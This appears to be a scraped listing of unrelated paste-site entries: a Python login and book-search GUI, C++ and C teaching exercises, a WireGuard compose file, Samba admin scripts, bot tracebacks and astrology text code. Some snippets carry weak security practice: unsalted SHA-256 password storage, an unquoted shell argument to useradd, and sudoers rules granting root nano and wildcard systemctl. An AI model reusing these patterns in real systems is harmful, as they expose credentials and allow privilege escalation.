    global confirm_password, signup_button

    try:
        login_button.destroy()
    except:
        try:
            confirm_password.destroy()
            signup_button.destroy()
        except:
            pass

    confirm_password = ctk.CTkEntry(frame, placeholder_text=""Confirm Password"", fg_color=""#1f1f1f"", show=""*"", height=40, width=200)
    confirm_password.pack(pady=12, padx=10)

    show_password.configure(command=lambda: show_pass([password, confirm_password]))

    signup_button = ctk.CTkButton(frame, text=""Sign Up"", text_color=""#121212"", fg_color=""#bb86fc"", hover_color=""#5704bc"", font=(""Roboto"", 13, ""bold""), cursor=""hand2"", command=sign_up)
    signup_button.pack(pady=12, padx=10)

    win.bind(""<Return>"", lambda event: sign_up())

def login():

    global pass_notification

    try:

        with open(database_loc, ""r"") as f:

            database = json.load(f)

    except:

        database = """"

    if (username.get() != """") and (password.get() != """"):

        user = hashlib.sha256(username.get().encode()).hexdigest()
        passw = hashlib.sha256(password.get().encode()).hexdigest()

        if (user in database) and (database[user] == passw): text = ""Login Successful!""; color = ""green""; x = 90
        else: text = ""Username or Password is incorrect.""; color = ""red""; x = 92

        pass_notification = ctk.CTkLabel(frame, text=text, font=(""Roboto"", 10, ""bold""), text_color=color, height=0, width=300)
        pass_notification.place(x=x, y=212)

        frame.after(5000, pass_notification.destroy)

        if text == ""Login Successful!"":
            book_collection()

    else:

        if username.get() == """": text = ""You have a Username right?""; x = 92
        else: text = ""I believe you forgot the Password""; x = 91

        pass_notification = ctk.CTkLabel(frame, text=text, font=(""Roboto"", 10, ""bold""), text_color=""red"", height=0, width=300)
        pass_notification.place(x=x, y=212)

        frame.after(5000, pass_notification.destroy)

def sign_up(username_taken = False):
    
    global pass_notification
    
    if (password.get() == confirm_password.get()) and (password.get() != """" and confirm_password.get() != """" and username.get() != """") and (not username_taken):

        user = hashlib.sha256(username.get().encode()).hexdigest()
        passw = hashlib.sha256(password.get().encode()).hexdigest()

        if not os.path.exists(database_loc): 
            
            with open(database_loc, 'w+') as f: pass

        with open(database_loc, ""r"") as f:
            
            try: database = json.load(f)
            except: database = """"
        
        if database == """":
            
            dict = {user: passw}

            with open(database_loc, ""w+"") as f: json.dump(dict, f, indent=4)

            pass_notification = ctk.CTkLabel(frame, text=""Registered Successfully"", font=(""Roboto"", 10, ""bold""), text_color=""green"", height=0, width=300)
            pass_notification.place(x=89, y=276)

            frame.after(5000, pass_notification.destroy)

        elif user not in database:

            dict = database
            dict[user] = passw

            with open(database_loc, ""w+"") as f: json.dump(dict, f, indent=4)

            pass_notification = ctk.CTkLabel(frame, text=""Registered Successfully"", font=(""Roboto"", 10, ""bold""), text_color=""green"", height=0, width=300)
            pass_notification.place(x=89, y=276)

            frame.after(5000, pass_notification.destroy)

        else:

            username_taken = True
            sign_up(username_taken)

        if not username_taken:
            if not os.path.exists(f""{data_loc}\\Accounts""):
                os.mkdir(f""{data_loc}\\Accounts"")

            os.mkdir(f""{data_loc}\\Accounts\\{user}"")

    else:

        if username.get() == """": text = ""Don't you need a Username?""; x = 140
        elif (password.get() == """") and (confirm_password.get() == """"): text = ""Trust Me. You need a Password""; x = 140
        elif password.get() != confirm_password.get(): text = ""The Passwords do not Match""; x = 140
        else: text = ""Username is already taken""; x = 140

        pass_notification = ctk.CTkLabel(frame, text=text, font=(""Roboto"", 10, ""bold""), text_color=""red"", height=0, width=200)
        pass_notification.place(x=x, y=276)

        frame.after(5000, pass_notification.destroy)

#Book Collection
        
def book_collection():

    frame.destroy()

    w = win.winfo_screenwidth()
    h = win.winfo_screenheight()

    center(win, (w, h), 2)
    win.attributes('-fullscreen', True)

    page = ctk.CTkFrame(win, fg_color=""#1f1f1f"")
    page.pack(pady=20, padx=60, fill=""both"", expand=True)

    add_btn = ctk.CTkButton(page, text=""+"", text_color=""#121212"", fg_color=""#bb86fc"", hover_color=""#5704bc"", font=(""Roboto"", 45, ""bold""), width=80, height=80, corner_radius=30, command=lambda: add_book(add_btn))
    add_btn.pack(side=ctk.BOTTOM, anchor=""e"", padx=8, pady=8)

def add_book(add_btn):
    global saved_widgets, search_bar

    add_btn.configure(state=""disabled"", fg_color=""#716876"", text_color_disabled=""#666666"")

    w = win.winfo_screenwidth()
    h = win.winfo_screenheight()

    search = ctk.CTkFrame(win, bg_color=""#1f1f1f"", fg_color=""#0f0f0f"", width=0.1*w, height=0.1*h, corner_radius=40)
    search.place(relx=0.5, rely=0.5, anchor=ctk.CENTER)

    size = 0.1
    while size <= 0.8:
        search.configure(width=size*w, height=size*h)
        
        win.update()
        sleep(0.008)

        size += 0.04

    size=0.8
    search.configure(width=size*w, height=size*h)

    search_term = ctk.StringVar()
    search_term.trace_add('write', lambda var, index, mode: run_thread(search, search_term))

    search_bar = ctk.CTkEntry(search, fg_color=""#1f1f1f"", placeholder_text=""Enter ISBN No. or Name of the Book..."", textvariable=search_term, width=800, height=50)
    search_bar.place(relx=0.48, rely=0.1, anchor=ctk.CENTER)
    
    search_button = ctk.CTkButton(search, fg_color=""#2f2f2f"", hover_color=""#1f1f1f"", text="""", image=ctk.CTkImage(dark_image=Image.open(f""{data_loc}\\Images\\Search.png"")), width=50, height=50, command=lambda: run_thread(search=search, isbn=search_bar))
    search_button.place(in_=search_bar, relx=1.04, rely=0.5, anchor=ctk.CENTER)

    saved_widgets = [search_bar, search_button]

def run_thread(search, search_term):

    thread = threading.Thread(target=lambda: update_search(search, search_term))
    thread.start()

kill = False

def kill_recommendation(recommendation, search_term, search_text):
    while True:
        time.sleep(0.1)
        if search_text != search_term.get():
            recommendation.destroy()
            break

def update_search(search, search_term): 
    global threads
    
    search_text = search_term.get()

    time.sleep(0.5)

    if search_term.get() != search_text:
        return

    w = win.winfo_screenwidth()
    h = win.winfo_screenheight()

    recommendations = get_book_details(search_term.get())

    list_of_recommendations = []

    def load_recommendation(book):

        with urllib.request.urlopen(book[""thumbnail""]) as u:
            raw_data = u.read()

        image = Image.open(io.BytesIO(raw_data))
        
        recommendation = ctk.CTkButton(search, image=ctk.CTkImage(dark_image=image, size=(225, 250)), fg_color=""#0f0f0f"", hover_color=""#1f1f1f"", compound=ctk.TOP, text=book[""title""], width=250, height=315, command=lambda book=book: get_book(search, search_term, book))
        recommendation._text_label.configure(wraplength=150)
        thread = threading.Thread(target=lambda: kill_recommendation(recommendation, search_term, search_text))
        thread.start()

        list_of_recommendations.append(recommendation)
        
    threads = []

    for book in recommendations:
        thread = threading.Thread(target=lambda: load_recommendation(book))
        thread.start()

        threads.append(thread)

    while any(thread.is_alive() for thread in threads):
        time.sleep(0.1)

    iteration = 0

    y_level=160
    try:
        for recommendation in list_of_recommendations:

            if iteration % 5 == 0:
                recommendation.place(x=40, y=y_level)
                y_level += recommendation.cget(""height"")+50
            else:
                recommendation.place(in_=prev_recommendation, relx=1.2, rely=0)

            prev_recommendation = recommendation
            iteration += 1
    except:
        pass

def get_book(search, search_term, book):

    search_term.set("""")

    with urllib.request.urlopen(book[""thumbnail""]) as u:
        raw_data = u.read()

    image = Image.open(io.BytesIO(raw_data))

    for widget in search.winfo_children():
        if ""ctklabel"" in str(widget):
            widget.destroy()

    image = ctk.CTkLabel(search, text="""", image=ctk.CTkImage(dark_image=image, size=(275,400)))
    image.place(relx=0.05, rely=0.28)

    book_title = ctk.CTkLabel(search, text=f""Title: {book['title']}"", font=(""Roboto"", 16, ""bold""))
    book_title.place(in_=image, relx=1.2, rely=0.02)

    order = {""authors"":""Author(s)"", ""isbn10"":""ISBN-10"", ""isbn13"":""ISBN-13"", ""publisher"":""Publisher"", ""publish_date"":""Publish Date"", ""page_count"":""Pages"", ""description"":""Description"", ""maturity_rating"":""Maturity Rating""}

    prev_widget = book_title
    for title in order:
        widget = ctk.CTkLabel(search, text=f""{order[title]}: {book[title]}"", font=(""Roboto"", 16, ""bold""), wraplength=search.winfo_width()-440, justify=""left"")
        widget.place(in_=prev_widget, relx=0, rely=1.2)

        prev_widget = widget

def main():

    win.resizable(False, False)
    
    login_page(True)

    win.mainloop()

if __name__ == ""__main__"":

    data_loc = f""{__file__.removesuffix(os.path.basename(__file__))}Data""
    database_loc = f""{data_loc}\\Account Data Base.json""
    
    main()"
S4uQck6R,Untitled,MeehoweCK,C++,Friday 12th of April 2024 10:35:29 AM CDT,"#include <iostream>

using uilong = unsigned long long;

int czyPierwsza(uilong liczba) {
	if (liczba < 2) {
		return 0;
	}
	for (uilong i{ 2 }; i * i <= liczba; ++i) {
		if (liczba % i == 0) {
			return i;
		}
	}
	return 1;
}

uilong nastepnaPierwsza(uilong liczba) {
	do {
		++liczba;
	} while (czyPierwsza(liczba) != 1);
	return liczba;
}

int main() {
	uilong liczba;
	std::cout << ""Podaj liczbe naturalna: "";
	std::cin >> liczba;

	const auto wynik{ czyPierwsza(liczba) };

	if (wynik == 1) {
		std::cout << liczba << "" jest liczba pierwsza.\n"";
	}
	else {
		if (wynik == 0) {
			std::cout << liczba << "" nie jest liczba pierwsza, poniewaz jest mniejsza od 2.\n"";
		}
		else {
			std::cout << liczba << "" nie jest liczba pierwsza, poniewaz dzieli sie przez "" << wynik << "".\n"";
		}
		std::cout << ""Najmniejsza liczba pierwsza wieksza od "" << liczba << "" wynosi "" << nastepnaPierwsza(liczba) << "".\n"";
	}
	return 0;
}"
WfbF2v5g,Untitled,max12354678910,YAML,Friday 12th of April 2024 10:26:14 AM CDT,"                                          
services:
  wireguard:
    image: ""quay.io/linuxserver.io/wireguard:latest""
    container_name: ""wireguard""
    cap_add:
      - ""NET_ADMIN""
    environment:
      - ""PUID=0""
      - ""PGID=0""
      - ""PEERS=1""
      - ""TZ=Etc/Berlin""
      - ""SERVERURL=my_url.example""
      - ""SERVERPORT=51820""
      - ""INTERNAL_SUBNET=10.13.13.0/24""
      - ""ALLOWEDIPS=0.0.0.0/0""
      - ""LOG_CONFS=true""
    volumes:
      - ""wireguard:/config""
    networks:
      wireguard:
        ipv4_address: ""10.13.13.1""
    ports:
      - ""51820:51820/udp""
    sysctls:
      - ""net.ipv4.conf.all.src_valid_mark=1""
    restart: ""unless-stopped""
    labels:
      - ""traefik.enable=false""


  wireguard-ui:
    image: ""docker.io/ngoduykhanh/wireguard-ui:latest""
    container_name: ""wireguard-ui""
    depends_on:
      - ""wireguard""
    cap_add:
      - ""NET_ADMIN""
    environment:
      - ""EMAIL_FROM_ADDRESS=my_url.example""
      - ""SESSION_SECRET_file=/run/secrets/wireguard-ui-session""
      - ""BIND_ADDRESS=0.0.0.0:80""
      - ""WGUI_USERNAME=admin""
      - ""WGUI_PASSWORD_FILE=/run/secrets/wireguard-ui""
      - ""WGUI_MANAGE_START=true""
      - ""WGUI_MANAGE_RESTART=true""
      - ""WGUI_ENPOINT_ADDRESS=my_url.example
      - ""WGUI_DNS=9.9.9.9""
    restart: ""unless-stopped""
    networks:
      - ""traefik""
      - ""wireguard""
    volumes:
      - ""wgui:/app/db""
      - ""wireguard:/etc/wireguard""
    secrets:
      - ""wireguard-ui""
    labels:
      - ""traefik.enable=true""
      - ""traefik.http.routers.wgui.entryPoints=web-secure""
      - ""traefik.http.routers.wgui.rule=Host(`my_url.example)""
      - ""traefik.http.routers.wgui.tls=true""
      - ""traefik.http.routers.wgui.tls.certresolver=letsencrypt""
      - ""traefik.http.services.wgui.loadbalancer.server.port=80""

networks:
  wireguard:
    name: ""wireguard""
    ipam:
      config:
        - subnet: ""10.13.13.0/24""
  traefik:
    external: true

volumes:
  wireguard:
    name: ""wireguard""
  wgui:
    name: ""wireguard-ui""

secrets:
  wireguard-ui:
    external: true
  wireguard-ui-session:
    external: true
"
1y4hBzTx,Untitled,retroman,FreeBasic,Friday 12th of April 2024 10:23:04 AM CDT,"dim mystr as string = ""hello""

dim tmp as string = ""     ""

print mystr

tmp[0] = mystr[4]
tmp[1] = mystr[3]
tmp[2] = mystr[2]
tmp[3] = mystr[1]
tmp[4] = mystr[0]

print tmp

mystr = tmp

print mystr"
4KmxUhZP,СПРИНТ № 7 | Модель памяти в C++ | Урок 3: Указатели. Открываем доступ к памяти 2/2,chevengur,C++,Friday 12th of April 2024 10:16:46 AM CDT,"#include <cassert>
#include <string>
#include <iostream>

using namespace std;

template <typename T>
bool IsSameObject(T& value1, T& value2) {
    if (&value1 == &value2)
        return true;
    return false;
    /*Напишите тело функции самостоятельно */
}

int main() {
    using namespace std;

    const int x = 1;
    const int y = 1;

    //x и y — разные объекты, хоть и имеющие одинаковое значение
    assert(!IsSameObject(x, y));
    // Оба аргумента — один и тот же объект
    assert(IsSameObject(x, x));

    const string name1 = ""Harry""s;
    const string name1_copy = name1;
    const string name2 = ""Ronald""s;
    auto name1_ptr = &name1;
    const string& name1_ref = name1;

    assert(!IsSameObject(name1, name2));  // Две строки с разными значениями — разные объекты
    assert(!IsSameObject(name1, name1_copy));  // Строка и её копия — разные объекты

    // Оба параметра ссылаются на одну и ту же строку
    assert(IsSameObject(name1, name1));
    assert(IsSameObject(name2, name2));
    assert(IsSameObject(name1_copy, name1_copy));

    // Разыменованный указатель на объект и сам объект — один и тот же объект
    assert(IsSameObject(*name1_ptr, name1));

    // Переменная и ссылка на неё относятся к одному и тому же объекту
    assert(IsSameObject(name1_ref, name1));
    // Ссылка на объект и разыменованный указатель на объект относятся к одному и тому же объекту
    assert(IsSameObject(name1_ref, *name1_ptr));
}"
RrEi5mbw,addsambauser,sergio_educacionit,Bash,Friday 12th of April 2024 10:16:22 AM CDT,"#!/bin/bash

/usr/sbin/useradd -s /usr/sbin/nologin -G sambashare -d /home/$1 -m $1
"
gBMzkbHZ,sudoers samba,sergio_educacionit,Bash,Friday 12th of April 2024 10:15:16 AM CDT,"Defaults	env_reset
Defaults	mail_badpass
# Se agrega ':/opt/bin' a la variable 'secure_path'
Defaults secure_path=""/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin""
Defaults	use_pty

# Alias de comandos administrativos de samba
Cmnd_Alias SYSD_NMBD = /usr/bin/systemctl * nmbd*

Cmnd_Alias USRS_NMBD = /opt/bin/addsambauser *, \
/usr/bin/smbpasswd -[ade] *

Cmnd_Alias CONF_NMBD = /usr/bin/nano /etc/samba/smb.conf


root	ALL=(ALL:ALL) ALL

%sudo	ALL=(ALL:ALL) ALL

# grupo de usuarios administradores del servicio samba

%sambaadmin debian=(root:root) SYSD_NMBD, USRS_NMBD, CONF_NMBD


"
cHukdRGW,TimeoutError:,basedcount_bot,Python,Friday 12th of April 2024 09:56:10 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 123, in check_mail
    async for message in reddit_instance.inbox.unread(limit=None):  # Message
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 34, in __anext__
    await self._next_batch()
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 785, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 567, in _objectify_request
    await self.request(
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1032, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 331, in _request_with_retries
    return await response.json()
           ^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/aiohttp/client_reqrep.py"", line 1161, in json
    await self.read()
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/aiohttp/client_reqrep.py"", line 1101, in read
    self._body = await self.content.read()
                 ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/aiohttp/streams.py"", line 373, in read
    block = await self.readany()
            ^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/aiohttp/streams.py"", line 395, in readany
    await self._wait(""readany"")
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/aiohttp/streams.py"", line 301, in _wait
    with self._timer:
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/aiohttp/helpers.py"", line 735, in __exit__
    raise asyncio.TimeoutError from None
TimeoutError
"
4rtpKhry,TimeoutError:,basedcount_bot,Python,Friday 12th of April 2024 09:55:54 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 263, in read_comments
    async for comment in pcm_subreddit.stream.comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/util.py"", line 160, in stream_generator
    [result async for result in function(limit=limit, **function_kwargs)]
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/util.py"", line 160, in <listcomp>
    [result async for result in function(limit=limit, **function_kwargs)]
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 34, in __anext__
    await self._next_batch()
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 785, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 567, in _objectify_request
    await self.request(
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1032, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 331, in _request_with_retries
    return await response.json()
           ^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/aiohttp/client_reqrep.py"", line 1161, in json
    await self.read()
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/aiohttp/client_reqrep.py"", line 1101, in read
    self._body = await self.content.read()
                 ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/aiohttp/streams.py"", line 373, in read
    block = await self.readany()
            ^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/aiohttp/streams.py"", line 395, in readany
    await self._wait(""readany"")
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/aiohttp/streams.py"", line 301, in _wait
    with self._timer:
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/aiohttp/helpers.py"", line 735, in __exit__
    raise asyncio.TimeoutError from None
TimeoutError
"
qWwi6jsj,js-competitive-in-out,ozz-life,JavaScript,Friday 12th of April 2024 09:53:38 AM CDT,"#!/usr/bin/env node
'use strict'

process.stdin.resume()
process.stdin.setEncoding('utf-8')

let currentLine = 0
let inputString = ''

process.stdin.on('data', raw_data => {
    inputString += raw_data
})

process.stdin.on('end', _ => {
    inputString = inputString.trim().split('\n').map(line => {
        return line.trim()
    })
    main()
})

function readLine() {
    return inputString[currentLine++]
}

/*
 * Code Start
 ******************************************************************************/

function main() {
    let [k1, m, k2, p2, n2] = readLine().split("" "").map(Number)
}"
Fwstg2Km,Laborator_AVL_PAA,Bobita,C,Friday 12th of April 2024 09:43:18 AM CDT,"#include <stdio.h>
#include <stdlib.h>

// Structura pentru un nod din arbore
typedef struct Node {
    int key;
    struct Node *left;
    struct Node *right;
    int height;
} Node;

// Functie pentru a determina inaltimea unui nod
int height(Node *N) {
    if (N == NULL)
        return 0;
    return N->height;
}

// Functie pentru a calcula maximul dintre doua numere
int max(int a, int b) {
    return (a > b) ? a : b;
}

// Functie pentru alocarea unui nou nod cu cheia data
Node* newNode(int key) {
    Node* node = (Node*)malloc(sizeof(Node));
    node->key = key;
    node->left = NULL;
    node->right = NULL;
    node->height = 1;  // Noul nod este initial adaugat la frunza
    return(node);
}

// Rotatie la dreapta
Node *rightRotate(Node *y) {
    Node *x = y->left;
    Node *T2 = x->right;

    // Executa rotatia
    x->right = y;
    y->left = T2;

    // Actualizeaza inaltimile
    y->height = max(height(y->left), height(y->right)) + 1;
    x->height = max(height(x->left), height(x->right)) + 1;

    // Returneaza noua radacina
    return x;
}

// Rotatie la stanga
Node *leftRotate(Node *x) {
    Node *y = x->right;
    Node *T2 = y->left;

    // Executa rotatia
    y->left = x;
    x->right = T2;

    // Actualizeaza inaltimile
    x->height = max(height(x->left), height(x->right)) + 1;
    y->height = max(height(y->left), height(y->right)) + 1;

    // Returneaza noua radacina
    return y;
}

// Obtine factorul de echilibru al nodului N
int getBalance(Node *N) {
    if (N == NULL)
        return 0;
    return height(N->left) - height(N->right);
}

// Functie recursiva pentru inserarea unei chei in subarborele cu radacina
// la nodul dat si returneaza noua radacina a subarborelui
Node* insert(Node* node, int key) {
    /* 1. Efectuam inserarea normala a unui BST */
    if (node == NULL)
        return(newNode(key));

    if (key < node->key)
        node->left = insert(node->left, key);
    else if (key > node->key)
        node->right = insert(node->right, key);
    else // Chei egale nu sunt permise in arborele AVL
        return node;

    /* 2. Actualizam inaltimea acestui nod stramos */
    node->height = 1 + max(height(node->left), height(node->right));

    /* 3. Obtinem factorul de echilibru al acestui nod stramos
       pentru a verifica daca acest nod a devenit dezechilibrat */
    int balance = getBalance(node);

    // Daca acest nod devine dezechilibrat, atunci exista 4 cazuri

    // Cazul stanga-stanga
    if (balance > 1 && key < node->left->key)
        return rightRotate(node);

    // Cazul dreapta-dreapta
    if (balance < -1 && key > node->right->key)
        return leftRotate(node);

    // Cazul stanga-dreapta
    if (balance > 1 && key > node->left->key) {
        node->left = leftRotate(node->left);
        return rightRotate(node);
    }

    // Cazul dreapta-stanga
    if (balance < -1 && key < node->right->key) {
        node->right = rightRotate(node->right);
        return leftRotate(node);
    }

    /* returneaza pointer-ul nodului (nechimbat) */
    return node;
}

// Functia utilitara pentru a gasi nodul cu cea mai mica valoare
// care este mai mare decat nodul dat
Node * minValueNode(Node* node) {
    Node* current = node;

    /* gaseste frunza cea mai din stanga */
    while (current->left != NULL)
        current = current->left;

    return current;
}

// Functie recursiva pentru a sterge un nod cu o cheie data
// din subarborele cu radacina data si returneaza radacina
Node* deleteNode(Node* root, int key) {
    // PASUL 1: EFECTUARE STERGERE NORMALA BST

    if (root == NULL)
        return root;

    // Daca cheia de sters este mai mica decat cheia radacinii,
    // atunci se afla in subarborele stang
    if ( key < root->key )
        root->left = deleteNode(root->left, key);

    // Daca cheia de sters este mai mare decat cheia radacinii,
    // atunci se afla in subarborele drept
    else if( key > root->key )
        root->right = deleteNode(root->right, key);

    // Daca cheia este aceeasi cu cheia radacinii, atunci acesta
    // este nodul care trebuie sters
    else {
        // nod cu unul sau fara copil
        if( (root->left == NULL) || (root->right == NULL) ) {
            Node *temp = root->left ? root->left : root->right;

            // Fara copil
            if (temp == NULL) {
                temp = root;
                root = NULL;
            }
            else // Un copil
             *root = *temp; // Copierea continutului copilului

            free(temp);
        }
        else {
            // Nod cu doi copii: Ia succesorul inordine (cel mai mic
            // din subarborele drept)
            Node* temp = minValueNode(root->right);

            // Copiaza succesorul inordine in acest nod
            root->key = temp->key;

            // Sterge succesorul inordine
            root->right = deleteNode(root->right, temp->key);
        }
    }

    // Daca arborele avea doar un nod atunci returneaza
    if (root == NULL)
      return root;

    // PASUL 2: ACTUALIZEAZA INALTIMEA NODULUI CURENT
    root->height = 1 + max(height(root->left), height(root->right));

    // PASUL 3: VERIFICA ECHILIBRUL NODULUI CURENT
    int balance = getBalance(root);

    // Daca acest nod devine dezechilibrat, atunci exista 4 cazuri

    // Cazul stanga-stanga
    if (balance > 1 && getBalance(root->left) >= 0)
        return rightRotate(root);

    // Cazul stanga-dreapta
    if (balance > 1 && getBalance(root->left) < 0) {
        root->left = leftRotate(root->left);
        return rightRotate(root);
    }

    // Cazul dreapta-dreapta
    if (balance < -1 && getBalance(root->right) <= 0)
        return leftRotate(root);

    // Cazul dreapta-stanga
    if (balance < -1 && getBalance(root->right) > 0) {
        root->right = rightRotate(root->right);
        return leftRotate(root);
    }

    return root;
}

// Functie de afisare a arborelui in inordine
void inOrder(Node *root) {
    if (root != NULL) {
        inOrder(root->left);
        printf(""%d "", root->key);
        inOrder(root->right);
    }
}

int main() {
  Node *root = NULL;

  // Exemplu de inserari
  root = insert(root, 10);
  root = insert(root, 20);
  root = insert(root, 30);
  root = insert(root, 40);
  root = insert(root, 50);
  root = insert(root, 25);

  printf(""Inorder traversal of the constructed AVL tree is \n"");
  inOrder(root);

  root = deleteNode(root, 20);

  printf(""\nInorder traversal after deletion of 20 \n"");
  inOrder(root);

  return 0;
}
"
bcdst2H8,СПРИНТ № 7 | Модель памяти в C++  | Урок 3: Указатели. Открываем доступ к памяти 1/2,chevengur,C++,Friday 12th of April 2024 09:05:03 AM CDT,"#include <cassert>
#include <string>
#include <algorithm>

// Шаблонная функция Swap обменивает значения двух объектов одного и того же типа,
// указатели на которые она принимает в качестве аргументов
template <typename T>
void Swap(T* value1, T* value2) {
    T p = *value1;
    *value1 = *value2;
    *value2 = p;

    // Реализуйте тело функции самостоятельно
}

int main() {
    using namespace std;

    {
        int x = 1;
        int y = 5;

        Swap(&x, &y);
        assert(x == 5);
        assert(y == 1);
    }

    {
        string one = ""one""s;
        string two = ""two""s;
        Swap(&one, &two);
        assert(one == ""two""s);
        assert(two == ""one""s);
    }

    {
        // Видимость структуры Point ограничена текущим блоком
        struct Point {
            int x, y;
        };

        Point p1{ 1, 2 };
        Point p2{ 3, 4 };

        Swap(&p1, &p2);
        assert(p1.x == 3 && p1.y == 4);
        assert(p2.x == 1 && p2.y == 2);
    }
    return 0;
}"
PY4jxYef,Untitled,ArjanP,Python,Friday 12th of April 2024 08:42:36 AM CDT,"    def get_strength(self, obj):
        # Starting sentence about the planet's position
        dignities = f""The {obj.planet} in {obj.sign} ""

        # List to hold different status parts, easier to join later.
        status_parts = []

        # Check each condition and add to the list
        if essential.ruler(obj.sign):
            status_parts.append(f""rules {obj.sign}, indicating a strong alignment with its natural qualities"")
        if essential.exalt(obj.sign):
            status_parts.append(f""is exalted, enhancing its positive attributes"")
        if essential.fall(obj.sign):
            status_parts.append(f""is in fall, which may challenge its expression and weaken its effects"")
        if essential.detriment(obj.sign):
            status_parts.append(f""is in detriment, facing difficulties in fully manifesting its characteristics"")
        if essential.dayTrip(obj.sign):
            status_parts.append(""is strong in day triplicity, favoring its energies during the day"")
        elif essential.nightTrip(obj.sign):
            status_parts.append(""is strong in night triplicity, favoring its energies during the night"")
        if essential.term(obj.sign, obj.lon):
            status_parts.append(f""is in its term, gaining some specific strengths in certain degrees of {obj.sign}"")
        if essential.face(obj.sign, obj.lon):
            status_parts.append(f""is in its face, which provides a minor dignity at these degrees"")
        if essential.isPeregrine(obj.planet, obj.sign, obj.lon):
            status_parts.append(""is peregrine, lacking any essential dignity and thus may feel out of place or ineffective"")

        # Joining all the status parts with proper punctuation
        if status_parts:
            dignities += ""demonstrates that "" + ""; "".join(status_parts)
        else:
            dignities += ""does not have any strong essential dignities, which might indicate a lack of significant influence or a neutral position""

        # Finish with a period to complete the sentence
        return dignities + ""."""
